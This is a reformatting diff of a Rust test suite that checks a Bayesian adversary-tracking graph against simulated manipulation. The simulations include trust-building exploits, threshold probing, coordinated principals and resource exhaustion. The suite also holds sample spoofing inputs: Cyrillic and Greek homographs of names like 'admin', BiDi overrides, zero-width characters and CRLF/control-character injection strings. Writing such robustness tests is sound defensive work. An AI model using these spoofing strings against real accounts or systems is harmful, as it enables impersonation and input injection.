-            assert!(result2.evidence_hash.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_'),
-                "Hash should contain safe characters: {}", result2.evidence_hash);
+            assert!(
+                !result2.evidence_hash.is_empty(),
+                "Hash should not be empty"
+            );
+            assert!(
+                result2.evidence_hash.len() >= 32,
+                "Hash should be reasonable length: {}",
+                result2.evidence_hash.len()
+            );
+            assert!(
+                result2
+                    .evidence_hash
+                    .chars()
+                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_'),
+                "Hash should contain safe characters: {}",
+                result2.evidence_hash
+            );
         }
 
         // Test 2: Hash chain ordering and dependency attacks
         let chain_manipulation_sequences = vec![
             // Forward then reverse evidence chain
-            vec![("evidence_a", "trace_1"), ("evidence_b", "trace_2"), ("evidence_c", "trace_3")],
-            vec![("evidence_c", "trace_3"), ("evidence_b", "trace_2"), ("evidence_a", "trace_1")],
-
+            vec![
+                ("evidence_a", "trace_1"),
+                ("evidence_b", "trace_2"),
+                ("evidence_c", "trace_3"),
+            ],
+            vec![
+                ("evidence_c", "trace_3"),
+                ("evidence_b", "trace_2"),
+                ("evidence_a", "trace_1"),
+            ],
             // Interleaved evidence chains
-            vec![("evidence_1", "trace_a"), ("evidence_2", "trace_b"), ("evidence_1", "trace_c"), ("evidence_2", "trace_d")],
-
+            vec![
+                ("evidence_1", "trace_a"),
+                ("evidence_2", "trace_b"),
+                ("evidence_1", "trace_c"),
+                ("evidence_2", "trace_d"),
+            ],
             // Duplicate evidence with different traces
-            vec![("same_evidence", "trace_1"), ("same_evidence", "trace_2"), ("same_evidence", "trace_3")],
-
+            vec![
+                ("same_evidence", "trace_1"),
+                ("same_evidence", "trace_2"),
+                ("same_evidence", "trace_3"),
+            ],
             // Evidence with hash-confusing content
-            vec![("prefix_suffix", "trace"), ("prefix", "_suffixetrace"), ("prefi", "x_suffixetrace")],
+            vec![
+                ("prefix_suffix", "trace"),
+                ("prefix", "_suffixetrace"),
+                ("prefi", "x_suffixetrace"),
+            ],
         ];
 
         for (chain_idx, sequence) in chain_manipulation_sequences.iter().enumerate() {
@@ -2413,13 +2737,9 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             let mut chain_hashes = Vec::new();
 
             for (evidence, trace) in sequence {
-                let observation = AdversaryObservation::new(
-                    principal_id.clone(),
-                    0.5,
-                    50,
-                    evidence,
-                    trace,
-                ).unwrap();
+                let observation =
+                    AdversaryObservation::new(principal_id.clone(), 0.5, 50, evidence, trace)
+                        .unwrap();
 
                 if let Ok(posterior) = graph.ingest(&observation) {
                     push_bounded(&mut chain_hashes, posterior.evidence_hash.clone(), 20);
@@ -2430,8 +2750,13 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             if chain_hashes.len() > 1 {
                 // Each step should produce a different hash (evidence chaining)
                 for i in 1..chain_hashes.len() {
-                    assert_ne!(chain_hashes[i-1], chain_hashes[i],
-                        "Chain sequence {} step {} should produce different hash", chain_idx, i);
+                    assert_ne!(
+                        chain_hashes[i - 1],
+                        chain_hashes[i],
+                        "Chain sequence {} step {} should produce different hash",
+                        chain_idx,
+                        i
+                    );
                 }
             }
         }
@@ -2450,7 +2775,8 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 (i % 1000) + 1,
                 &evidence,
                 &trace,
-            ).unwrap();
+            )
+            .unwrap();
 
             if let Ok(posterior) = graph.ingest(&observation) {
                 // Check hash distribution properties
@@ -2469,12 +2795,22 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         let min_prefix_count = hash_prefixes.values().min().unwrap_or(&0);
         let prefix_count = hash_prefixes.len();
 
-        assert!(prefix_count >= 200, "Should have diverse hash prefixes: {}", prefix_count);
-        assert!(*max_prefix_count <= distribution_test_count / 50,
-            "Hash clustering should be limited: max {} in {}", max_prefix_count, distribution_test_count);
+        assert!(
+            prefix_count >= 200,
+            "Should have diverse hash prefixes: {}",
+            prefix_count
+        );
+        assert!(
+            *max_prefix_count <= distribution_test_count / 50,
+            "Hash clustering should be limited: max {} in {}",
+            max_prefix_count,
+            distribution_test_count
+        );
 
-        println!("Hash distribution test completed: {} prefixes, max cluster {}, min cluster {}",
-            prefix_count, max_prefix_count, min_prefix_count);
+        println!(
+            "Hash distribution test completed: {} prefixes, max cluster {}, min cluster {}",
+            prefix_count, max_prefix_count, min_prefix_count
+        );
     }
 
     #[test]
@@ -2484,33 +2820,61 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         // Test 1: Adversary behavior modeling edge cases and policy bypass attempts
         let adversary_modeling_attack_scenarios = vec![
             // Gradual trust building then rapid exploitation
-            ("gradual_exploit", vec![
-                (0.01, 10), (0.02, 10), (0.05, 10), (0.1, 10), (0.2, 10), // Build trust
-                (0.95, 1000), (0.99, 1000), (0.999, 1000) // Exploit trust
-            ]),
-
+            (
+                "gradual_exploit",
+                vec![
+                    (0.01, 10),
+                    (0.02, 10),
+                    (0.05, 10),
+                    (0.1, 10),
+                    (0.2, 10), // Build trust
+                    (0.95, 1000),
+                    (0.99, 1000),
+                    (0.999, 1000), // Exploit trust
+                ],
+            ),
             // Oscillating behavior to confuse modeling
-            ("oscillating", vec![
-                (0.9, 100), (0.1, 100), (0.9, 100), (0.1, 100), (0.9, 100), (0.1, 100)
-            ]),
-
+            (
+                "oscillating",
+                vec![
+                    (0.9, 100),
+                    (0.1, 100),
+                    (0.9, 100),
+                    (0.1, 100),
+                    (0.9, 100),
+                    (0.1, 100),
+                ],
+            ),
             // Threshold probing (finding policy boundaries)
-            ("threshold_probe", vec![
-                (0.49, 100), (0.50, 100), (0.51, 100), (0.499, 100), (0.501, 100)
-            ]),
-
+            (
+                "threshold_probe",
+                vec![
+                    (0.49, 100),
+                    (0.50, 100),
+                    (0.51, 100),
+                    (0.499, 100),
+                    (0.501, 100),
+                ],
+            ),
             // Volume-based manipulation (small changes with massive weight)
-            ("volume_manipulation", vec![
-                (0.45, 1), (0.455, 10000), (0.46, 1), (0.465, 10000)
-            ]),
-
+            (
+                "volume_manipulation",
+                vec![(0.45, 1), (0.455, 10000), (0.46, 1), (0.465, 10000)],
+            ),
             // Time-diluted attacks (consistent low-level malicious behavior)
             ("time_dilution", (0..1000).map(|_| (0.55, 1)).collect()),
-
             // Mixed signal injection (alternating benign/malicious at different rates)
-            ("mixed_signal", vec![
-                (0.01, 100), (0.01, 100), (0.99, 1), (0.01, 100), (0.01, 100), (0.99, 1)
-            ]),
+            (
+                "mixed_signal",
+                vec![
+                    (0.01, 100),
+                    (0.01, 100),
+                    (0.99, 1),
+                    (0.01, 100),
+                    (0.01, 100),
+                    (0.99, 1),
+                ],
+            ),
         ];
 
         for (scenario_name, sequence) in adversary_modeling_attack_scenarios {
@@ -2524,49 +2888,81 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                     *weight,
                     format!("{}_evidence_{}", scenario_name, step_idx),
                     format!("{}_trace_{}", scenario_name, step_idx),
-                ).unwrap();
+                )
+                .unwrap();
 
                 if let Ok(posterior) = graph.ingest(&observation) {
                     push_bounded(&mut posterior_progression, posterior.posterior, 50);
 
                     // Verify modeling resists manipulation
-                    assert!(posterior.posterior.is_finite(),
-                        "Scenario {} step {} should maintain finite posterior", scenario_name, step_idx);
-                    assert!((0.0..=1.0).contains(&posterior.posterior),
-                        "Scenario {} step {} should keep posterior in valid range: {}", scenario_name, step_idx, posterior.posterior);
+                    assert!(
+                        posterior.posterior.is_finite(),
+                        "Scenario {} step {} should maintain finite posterior",
+                        scenario_name,
+                        step_idx
+                    );
+                    assert!(
+                        (0.0..=1.0).contains(&posterior.posterior),
+                        "Scenario {} step {} should keep posterior in valid range: {}",
+                        scenario_name,
+                        step_idx,
+                        posterior.posterior
+                    );
                 }
             }
 
             // Analyze posterior progression for resistance to manipulation
             if posterior_progression.len() > 10 {
                 let initial_avg = posterior_progression[..5].iter().sum::<f64>() / 5.0;
-                let final_avg = posterior_progression[posterior_progression.len()-5..].iter().sum::<f64>() / 5.0;
+                let final_avg = posterior_progression[posterior_progression.len() - 5..]
+                    .iter()
+                    .sum::<f64>()
+                    / 5.0;
 
                 match scenario_name {
                     "gradual_exploit" => {
                         // Should show gradual increase but not wild swings
-                        assert!(final_avg > initial_avg,
-                            "Gradual exploit should increase posterior: {} -> {}", initial_avg, final_avg);
-                        assert!(final_avg < 0.98,
-                            "Should resist complete trust exploitation: {}", final_avg);
-                    },
+                        assert!(
+                            final_avg > initial_avg,
+                            "Gradual exploit should increase posterior: {} -> {}",
+                            initial_avg,
+                            final_avg
+                        );
+                        assert!(
+                            final_avg < 0.98,
+                            "Should resist complete trust exploitation: {}",
+                            final_avg
+                        );
+                    }
                     "oscillating" => {
                         // Should converge to middle ground, not oscillate wildly
-                        let variance = posterior_progression.iter()
+                        let variance = posterior_progression
+                            .iter()
                             .map(|p| (p - 0.5).powi(2))
-                            .sum::<f64>() / posterior_progression.len() as f64;
-                        assert!(variance < 0.1,
-                            "Oscillating behavior should not cause high variance: {}", variance);
-                    },
+                            .sum::<f64>()
+                            / posterior_progression.len() as f64;
+                        assert!(
+                            variance < 0.1,
+                            "Oscillating behavior should not cause high variance: {}",
+                            variance
+                        );
+                    }
                     "time_dilution" => {
                         // Should slowly drift toward true likelihood
-                        assert!(final_avg > 0.5 && final_avg < 0.65,
-                            "Time dilution should converge near true likelihood: {}", final_avg);
-                    },
+                        assert!(
+                            final_avg > 0.5 && final_avg < 0.65,
+                            "Time dilution should converge near true likelihood: {}",
+                            final_avg
+                        );
+                    }
                     _ => {
                         // General resistance checks for other scenarios
-                        assert!(final_avg >= 0.001 && final_avg <= 0.999,
-                            "Scenario {} should avoid extreme posteriors: {}", scenario_name, final_avg);
+                        assert!(
+                            final_avg >= 0.001 && final_avg <= 0.999,
+                            "Scenario {} should avoid extreme posteriors: {}",
+                            scenario_name,
+                            final_avg
+                        );
                     }
                 }
             }
@@ -2602,11 +2998,16 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                         100,
                         format!("below_evidence_{}_{}", test_name, i),
                         format!("below_trace_{}_{}", test_name, i),
-                    ).unwrap();
+                    )
+                    .unwrap();
 
                     if let Ok(posterior) = graph.ingest(&observation) {
-                        assert!(posterior.posterior.is_finite(),
-                            "Below-boundary test {} iteration {} should be finite", test_name, i);
+                        assert!(
+                            posterior.posterior.is_finite(),
+                            "Below-boundary test {} iteration {} should be finite",
+                            test_name,
+                            i
+                        );
                     }
                 }
             }
@@ -2623,18 +3024,25 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                         100,
                         format!("above_evidence_{}_{}", test_name, i),
                         format!("above_trace_{}_{}", test_name, i),
-                    ).unwrap();
+                    )
+                    .unwrap();
 
                     if let Ok(posterior) = graph.ingest(&observation) {
-                        assert!(posterior.posterior.is_finite(),
-                            "Above-boundary test {} iteration {} should be finite", test_name, i);
+                        assert!(
+                            posterior.posterior.is_finite(),
+                            "Above-boundary test {} iteration {} should be finite",
+                            test_name,
+                            i
+                        );
                     }
                 }
             }
         }
 
         // Test 3: Multi-principal coordinated attack simulation
-        let coordinated_attack_principals = (0..20).map(|i| format!("coordinated_principal_{}", i)).collect::<Vec<_>>();
+        let coordinated_attack_principals = (0..20)
+            .map(|i| format!("coordinated_principal_{}", i))
+            .collect::<Vec<_>>();
 
         // Phase 1: Establish benign baseline for all principals
         for principal in &coordinated_attack_principals {
@@ -2645,7 +3053,8 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                     10,
                     format!("benign_evidence_{}_{}", principal, i),
                     format!("benign_trace_{}_{}", principal, i),
-                ).unwrap();
+                )
+                .unwrap();
                 let _ = graph.ingest(&observation);
             }
         }
@@ -2661,29 +3070,50 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                     100, // Higher weight for attack phase
                     format!("coordinated_evidence_{}_{}", principal, escalation_step),
                     format!("coordinated_trace_{}_{}", principal, escalation_step),
-                ).unwrap();
+                )
+                .unwrap();
                 let _ = graph.ingest(&observation);
             }
         }
 
         // Verify system maintains stability under coordinated attack
         let final_posteriors = graph.posteriors();
-        let coordinated_posteriors: Vec<_> = final_posteriors.iter()
+        let coordinated_posteriors: Vec<_> = final_posteriors
+            .iter()
             .filter(|p| p.principal_id.starts_with("coordinated_principal_"))
             .collect();
 
-        assert_eq!(coordinated_posteriors.len(), 20, "Should track all coordinated principals");
+        assert_eq!(
+            coordinated_posteriors.len(),
+            20,
+            "Should track all coordinated principals"
+        );
 
         for posterior in &coordinated_posteriors {
-            assert!(posterior.posterior.is_finite(),
-                "Coordinated attack should not break posterior computation for {}", posterior.principal_id);
-            assert!(posterior.posterior >= 0.3 && posterior.posterior <= 0.9,
-                "Coordinated attack should produce reasonable posteriors for {}: {}", posterior.principal_id, posterior.posterior);
-            assert_eq!(posterior.evidence_count, 60, "Should accumulate all evidence for {}", posterior.principal_id);
+            assert!(
+                posterior.posterior.is_finite(),
+                "Coordinated attack should not break posterior computation for {}",
+                posterior.principal_id
+            );
+            assert!(
+                posterior.posterior >= 0.3 && posterior.posterior <= 0.9,
+                "Coordinated attack should produce reasonable posteriors for {}: {}",
+                posterior.principal_id,
+                posterior.posterior
+            );
+            assert_eq!(
+                posterior.evidence_count, 60,
+                "Should accumulate all evidence for {}",
+                posterior.principal_id
+            );
         }
 
         // Verify the graph didn't become unstable
-        assert!(final_posteriors.len() <= 200, "Graph should not have excessive principals: {}", final_posteriors.len());
+        assert!(
+            final_posteriors.len() <= 200,
+            "Graph should not have excessive principals: {}",
+            final_posteriors.len()
+        );
     }
 
     #[test]
@@ -2703,15 +3133,24 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                     (obs_id % 100) + 1,
                     format!("memory_evidence_{}_{}", principal_id, obs_id),
                     format!("memory_trace_{}_{}", principal_id, obs_id),
-                ).unwrap();
+                )
+                .unwrap();
 
                 if let Ok(posterior) = memory_stress_graph.ingest(&observation) {
                     // Periodic validation that system remains stable
                     if principal_id % 1000 == 0 && obs_id % 50 == 0 {
-                        assert!(posterior.posterior.is_finite(),
-                            "Memory stress should not corrupt posteriors at principal {} obs {}", principal_id, obs_id);
-                        assert!((0.0..=1.0).contains(&posterior.posterior),
-                            "Memory stress should not break posterior bounds at principal {} obs {}", principal_id, obs_id);
+                        assert!(
+                            posterior.posterior.is_finite(),
+                            "Memory stress should not corrupt posteriors at principal {} obs {}",
+                            principal_id,
+                            obs_id
+                        );
+                        assert!(
+                            (0.0..=1.0).contains(&posterior.posterior),
+                            "Memory stress should not break posterior bounds at principal {} obs {}",
+                            principal_id,
+                            obs_id
+                        );
                     }
                 }
             }
@@ -2719,35 +3158,52 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             // Periodic memory usage check
             if principal_id % 2000 == 0 {
                 let current_posteriors = memory_stress_graph.posteriors();
-                assert_eq!(current_posteriors.len(), (principal_id + 1) as usize,
-                    "Should track exactly the right number of principals: {} != {}", current_posteriors.len(), principal_id + 1);
+                assert_eq!(
+                    current_posteriors.len(),
+                    (principal_id + 1) as usize,
+                    "Should track exactly the right number of principals: {} != {}",
+                    current_posteriors.len(),
+                    principal_id + 1
+                );
 
                 // Verify no memory corruption
                 for posterior in &current_posteriors {
-                    assert!(!posterior.principal_id.is_empty(),
-                        "Principal ID should not be corrupted");
-                    assert!(posterior.evidence_count <= observations_per_principal as u64,
-                        "Evidence count should be reasonable: {}", posterior.evidence_count);
+                    assert!(
+                        !posterior.principal_id.is_empty(),
+                        "Principal ID should not be corrupted"
+                    );
+                    assert!(
+                        posterior.evidence_count <= observations_per_principal as u64,
+                        "Evidence count should be reasonable: {}",
+                        posterior.evidence_count
+                    );
                 }
             }
         }
 
         // Test 2: Snapshot generation under memory pressure
         let large_snapshot = memory_stress_graph.snapshot("2026-04-17T15:00:00Z");
-        assert_eq!(large_snapshot.posteriors.len(), principal_count as usize,
-            "Large snapshot should contain all principals");
+        assert_eq!(
+            large_snapshot.posteriors.len(),
+            principal_count as usize,
+            "Large snapshot should contain all principals"
+        );
 
         // Test serialization of large snapshot (memory pressure test)
         let serialization_result = serde_json::to_string(&large_snapshot);
         match serialization_result {
             Ok(json_string) => {
-                assert!(json_string.len() > 1000000, "Large snapshot should produce substantial JSON");
+                assert!(
+                    json_string.len() > 1000000,
+                    "Large snapshot should produce substantial JSON"
+                );
 
                 // Test partial deserialization doesn't crash
                 let truncated_json = &json_string[..100000.min(json_string.len())];
-                let partial_parse_result: Result<serde_json::Value, _> = serde_json::from_str(truncated_json);
+                let partial_parse_result: Result<serde_json::Value, _> =
+                    serde_json::from_str(truncated_json);
                 // Partial parse may fail, but should not crash
-            },
+            }
             Err(_) => {
                 // Large serialization may fail due to memory limits - this is acceptable
             }
@@ -2758,8 +3214,16 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
 
         // Create principals with similar names to stress hash table performance
         let similar_principal_patterns = vec![
-            "principal", "principal_", "principal__", "principal_1", "principal_a",
-            "_principal", "__principal", "1_principal", "a_principal", "principal1",
+            "principal",
+            "principal_",
+            "principal__",
+            "principal_1",
+            "principal_a",
+            "_principal",
+            "__principal",
+            "1_principal",
+            "a_principal",
+            "principal1",
         ];
 
         for base_pattern in &similar_principal_patterns {
@@ -2769,21 +3233,33 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 // Add observations with computationally expensive likelihood patterns
                 for computation_step in 0..100 {
                     // Use computationally expensive likelihood calculation
-                    let complex_likelihood = ((computation_step as f64).sin().abs() +
-                                            (computation_step as f64 / 3.0).cos().abs()) / 2.0;
+                    let complex_likelihood = ((computation_step as f64).sin().abs()
+                        + (computation_step as f64 / 3.0).cos().abs())
+                        / 2.0;
 
                     let observation = AdversaryObservation::new(
                         principal_id.clone(),
                         complex_likelihood,
                         computation_step + 1,
-                        format!("complexity_evidence_{}_{}_{}", base_pattern, suffix_id, computation_step),
-                        format!("complexity_trace_{}_{}_{}", base_pattern, suffix_id, computation_step),
-                    ).unwrap();
+                        format!(
+                            "complexity_evidence_{}_{}_{}",
+                            base_pattern, suffix_id, computation_step
+                        ),
+                        format!(
+                            "complexity_trace_{}_{}_{}",
+                            base_pattern, suffix_id, computation_step
+                        ),
+                    )
+                    .unwrap();
 
                     if let Ok(posterior) = complexity_graph.ingest(&observation) {
                         // Verify computation remains stable despite complexity
-                        assert!(posterior.posterior.is_finite(),
-                            "Complex computation should remain finite for {} step {}", principal_id, computation_step);
+                        assert!(
+                            posterior.posterior.is_finite(),
+                            "Complex computation should remain finite for {} step {}",
+                            principal_id,
+                            computation_step
+                        );
                     }
                 }
             }
@@ -2802,15 +3278,22 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 1,
                 format!("rapid_evidence_{}", rapid_id),
                 format!("rapid_trace_{}", rapid_id),
-            ).unwrap();
+            )
+            .unwrap();
 
             if let Ok(posterior) = throughput_graph.ingest(&observation) {
                 // Spot check for stability
                 if rapid_id % 10000 == 0 {
-                    assert!(posterior.posterior.is_finite(),
-                        "Rapid ingestion should maintain finite posteriors at iteration {}", rapid_id);
-                    assert!(posterior.evidence_count > 0,
-                        "Rapid ingestion should maintain evidence count at iteration {}", rapid_id);
+                    assert!(
+                        posterior.posterior.is_finite(),
+                        "Rapid ingestion should maintain finite posteriors at iteration {}",
+                        rapid_id
+                    );
+                    assert!(
+                        posterior.evidence_count > 0,
+                        "Rapid ingestion should maintain evidence count at iteration {}",
+                        rapid_id
+                    );
                 }
             }
         }
@@ -2819,21 +3302,39 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         let throughput = rapid_fire_count as f64 / ingestion_duration.as_secs_f64();
 
         // Verify reasonable performance (should process at least 1000 observations/second)
-        assert!(throughput > 1000.0, "Throughput should be reasonable: {} obs/sec", throughput);
+        assert!(
+            throughput > 1000.0,
+            "Throughput should be reasonable: {} obs/sec",
+            throughput
+        );
 
         // Verify final state integrity after rapid ingestion
         let final_posteriors = throughput_graph.posteriors();
-        assert_eq!(final_posteriors.len(), 100, "Should have exactly 100 principals after rapid ingestion");
+        assert_eq!(
+            final_posteriors.len(),
+            100,
+            "Should have exactly 100 principals after rapid ingestion"
+        );
 
         for posterior in &final_posteriors {
-            assert!(posterior.posterior.is_finite(),
-                "All final posteriors should be finite: {}", posterior.posterior);
-            assert!(posterior.evidence_count == 1000,
-                "Evidence count should match rapid fire pattern: {}", posterior.evidence_count);
+            assert!(
+                posterior.posterior.is_finite(),
+                "All final posteriors should be finite: {}",
+                posterior.posterior
+            );
+            assert!(
+                posterior.evidence_count == 1000,
+                "Evidence count should match rapid fire pattern: {}",
+                posterior.evidence_count
+            );
         }
 
-        println!("Resource exhaustion test completed: {} principals, {} observations, {:.2} obs/sec throughput",
-            final_posteriors.len(), rapid_fire_count, throughput);
+        println!(
+            "Resource exhaustion test completed: {} principals, {} observations, {:.2} obs/sec throughput",
+            final_posteriors.len(),
+            rapid_fire_count,
+            throughput
+        );
     }
 
     #[test]
@@ -2845,43 +3346,35 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             // NFC vs NFD normalization attacks
             ("café", "cafe\u{0301}", "nfc_vs_nfd"),
             ("naïve", "nai\u{0308}ve", "nfc_vs_nfd_diaeresis"),
-
             // Unicode combining character attacks
             ("base", "base\u{0300}\u{0301}\u{0302}", "combining_stacking"),
             ("test", "te\u{0300}st", "combining_middle"),
-
             // Different Unicode representations of same glyph
             ("Ω", "\u{2126}", "ohm_vs_omega"), // Ohm symbol vs Greek capital omega
-            ("K", "\u{212A}", "kelvin_vs_k"), // Kelvin symbol vs Latin K
+            ("K", "\u{212A}", "kelvin_vs_k"),  // Kelvin symbol vs Latin K
             ("Å", "A\u{030A}", "angstrom_vs_a_ring"),
-
             // Width and spacing character attacks
             ("test", "test\u{3000}", "ideographic_space"),
             ("data", "data\u{2000}", "en_quad_space"),
             ("info", "info\u{200B}", "zero_width_space"),
-
             // BiDi (bidirectional text) override attacks
             ("admin", "\u{202E}nimda\u{202D}", "bidi_override"),
             ("user", "us\u{202E}re\u{202D}r", "bidi_middle"),
-
             // Invisible and non-printing character attacks
             ("hidden", "hid\u{FEFF}den", "zero_width_no_break"),
             ("secret", "sec\u{200C}ret", "zero_width_non_joiner"),
             ("stealth", "ste\u{200D}alth", "zero_width_joiner"),
-
             // Homograph attacks (different scripts, same appearance)
             ("admin", "аdmin", "cyrillic_a"), // Cyrillic а instead of Latin a
-            ("test", "tеst", "cyrillic_e"), // Cyrillic е instead of Latin e
+            ("test", "tеst", "cyrillic_e"),   // Cyrillic е instead of Latin e
             ("user", "usеr", "cyrillic_e_user"), // Cyrillic е in user
-
             // Mixed script attacks
             ("login", "lοgin", "greek_omicron"), // Greek omicron instead of Latin o
             ("access", "ассess", "mixed_cyrillic"), // Cyrillic ас instead of Latin ac
-
             // Confusing Unicode blocks
             ("data", "𝖉𝖆𝖙𝖆", "mathematical_bold_fraktur"), // Mathematical bold fraktur
-            ("info", "𝐢𝐧𝐟𝐨", "mathematical_bold"), // Mathematical bold
-            ("test", "𝓽𝓮𝓼𝓽", "mathematical_script"), // Mathematical script
+            ("info", "𝐢𝐧𝐟𝐨", "mathematical_bold"),         // Mathematical bold
+            ("test", "𝓽𝓮𝓼𝓽", "mathematical_script"),       // Mathematical script
         ];
 
         for (normal_form, attack_form, attack_name) in unicode_normalization_attacks {
@@ -2892,7 +3385,8 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 100,
                 normal_form,
                 format!("trace_normal_{}", attack_name),
-            ).unwrap();
+            )
+            .unwrap();
 
             // Test attack form
             let attack_obs = AdversaryObservation::new(
@@ -2901,40 +3395,60 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 100,
                 attack_form,
                 format!("trace_attack_{}", attack_name),
-            ).unwrap();
+            )
+            .unwrap();
 
             let normal_result = graph.ingest(&normal_obs).unwrap();
             let attack_result = graph.ingest(&attack_obs).unwrap();
 
             // Verify both forms are handled without corruption
-            assert!(normal_result.posterior.is_finite(),
-                "Normal Unicode form should be handled for {}: {}", attack_name, normal_form.escape_debug());
-            assert!(attack_result.posterior.is_finite(),
-                "Attack Unicode form should be handled for {}: {}", attack_name, attack_form.escape_debug());
+            assert!(
+                normal_result.posterior.is_finite(),
+                "Normal Unicode form should be handled for {}: {}",
+                attack_name,
+                normal_form.escape_debug()
+            );
+            assert!(
+                attack_result.posterior.is_finite(),
+                "Attack Unicode form should be handled for {}: {}",
+                attack_name,
+                attack_form.escape_debug()
+            );
 
             // Verify principal IDs are preserved exactly
-            assert_eq!(normal_result.principal_id, format!("unicode_normal_{}", attack_name),
-                "Normal form principal ID should be preserved for {}", attack_name);
-            assert_eq!(attack_result.principal_id, format!("unicode_attack_{}", attack_name),
-                "Attack form principal ID should be preserved for {}", attack_name);
+            assert_eq!(
+                normal_result.principal_id,
+                format!("unicode_normal_{}", attack_name),
+                "Normal form principal ID should be preserved for {}",
+                attack_name
+            );
+            assert_eq!(
+                attack_result.principal_id,
+                format!("unicode_attack_{}", attack_name),
+                "Attack form principal ID should be preserved for {}",
+                attack_name
+            );
 
             // Verify evidence hashes differ for different forms
             if normal_form != attack_form {
-                assert_ne!(normal_result.evidence_hash, attack_result.evidence_hash,
+                assert_ne!(
+                    normal_result.evidence_hash,
+                    attack_result.evidence_hash,
                     "Different Unicode forms should produce different evidence hashes for {}: '{}' vs '{}'",
-                    attack_name, normal_form.escape_debug(), attack_form.escape_debug());
+                    attack_name,
+                    normal_form.escape_debug(),
+                    attack_form.escape_debug()
+                );
             }
         }
 
         // Test 2: Overlong encoding and malformed UTF-8 attacks
         let encoding_bypass_attacks = vec![
             // Overlong UTF-8 sequences
-            "normal_a", // vs \xC1\x81 (overlong encoding of 'A')
+            "normal_a",     // vs \xC1\x81 (overlong encoding of 'A')
             "normal_slash", // vs \xC0\xAF (overlong encoding of '/')
-
             // Surrogate pair attacks in UTF-16
             "surrogate_test",
-
             // Invalid UTF-8 sequences
             "replacement_char",
         ];
@@ -2947,20 +3461,31 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 50,
                 test_case,
                 format!("encoding_trace_{}", idx),
-            ).unwrap();
+            )
+            .unwrap();
 
             let result = graph.ingest(&observation);
             match result {
                 Ok(posterior) => {
-                    assert!(posterior.posterior.is_finite(),
-                        "Encoding test {} should produce finite posterior", idx);
-                    assert!(!posterior.evidence_hash.is_empty(),
-                        "Encoding test {} should produce valid evidence hash", idx);
-                },
+                    assert!(
+                        posterior.posterior.is_finite(),
+                        "Encoding test {} should produce finite posterior",
+                        idx
+                    );
+                    assert!(
+                        !posterior.evidence_hash.is_empty(),
+                        "Encoding test {} should produce valid evidence hash",
+                        idx
+                    );
+                }
                 Err(error) => {
                     // Some encoding attacks may be rejected - ensure error is meaningful
-                    assert!(!error.to_string().is_empty(),
-                        "Encoding error should be meaningful for test {}: {:?}", idx, error);
+                    assert!(
+                        !error.to_string().is_empty(),
+                        "Encoding error should be meaningful for test {}: {:?}",
+                        idx,
+                        error
+                    );
                 }
             }
         }
@@ -2970,15 +3495,12 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             // Control character injection
             ("evidence\x00injection", "trace\r\ninjection"),
             ("evidence\x1Bmanipulation", "trace\x1Battack"),
-
             // Unicode category manipulation
             ("evidence\u{061C}rtl", "trace\u{061C}attack"), // Arabic letter mark
             ("evidence\u{2066}isolate", "trace\u{2069}pop"), // Directional isolate
-
             // Private use area characters
             ("evidence\u{E000}private", "trace\u{F8FF}private"),
             ("evidence\u{10FFFF}plane16", "trace\u{EFFFF}plane15"),
-
             // Noncharacters
             ("evidence\u{FFFE}nonchar", "trace\u{FFFF}nonchar"),
             ("evidence\u{FDD0}nonchar", "trace\u{FDEF}nonchar"),
@@ -2991,18 +3513,28 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 75,
                 evidence_content,
                 trace_content,
-            ).unwrap();
+            )
+            .unwrap();
 
             if let Ok(posterior) = graph.ingest(&observation) {
                 // Verify content is preserved exactly (no normalization corruption)
-                assert_eq!(posterior.last_trace_id, trace_content,
-                    "Trace ID should be preserved exactly: '{}'", trace_content.escape_debug());
+                assert_eq!(
+                    posterior.last_trace_id,
+                    trace_content,
+                    "Trace ID should be preserved exactly: '{}'",
+                    trace_content.escape_debug()
+                );
 
                 // Verify hash generation works despite Unicode content
-                assert!(!posterior.evidence_hash.is_empty(),
-                    "Evidence hash should be generated despite Unicode injection");
-                assert!(posterior.evidence_hash.len() >= 16,
-                    "Evidence hash should be reasonable length despite injection: {}", posterior.evidence_hash.len());
+                assert!(
+                    !posterior.evidence_hash.is_empty(),
+                    "Evidence hash should be generated despite Unicode injection"
+                );
+                assert!(
+                    posterior.evidence_hash.len() >= 16,
+                    "Evidence hash should be reasonable length despite injection: {}",
+                    posterior.evidence_hash.len()
+                );
             }
         }
 
@@ -3015,13 +3547,11 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             vec!["p", "р"], // Latin p vs Cyrillic р
             vec!["c", "с"], // Latin c vs Cyrillic с
             vec!["x", "х"], // Latin x vs Cyrillic х
-
             // Greek vs Latin confusables
             vec!["A", "Α"], // Latin A vs Greek Alpha
             vec!["B", "Β"], // Latin B vs Greek Beta
             vec!["O", "Ο"], // Latin O vs Greek Omicron
             vec!["P", "Ρ"], // Latin P vs Greek Rho
-
             // Mathematical vs normal characters
             vec!["A", "𝐀", "𝐴", "𝖠"], // Various mathematical A's
             vec!["a", "𝐚", "𝑎", "𝖆"], // Various mathematical a's
@@ -3037,32 +3567,48 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
